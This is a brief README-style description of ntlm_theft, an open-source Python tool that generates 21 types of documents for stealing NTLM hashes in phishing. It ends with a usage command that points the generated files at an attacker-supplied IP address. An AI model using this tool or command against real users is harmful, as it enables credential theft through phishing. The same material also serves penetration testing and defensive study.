NTLM_theft
------------
ntlm_theft is an Open Source Python3 Tool that generates 21 different types of NTLM2_hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.

#python3 ntlm_theft.py -g all -s $YOUR_IP -f test(customized file)
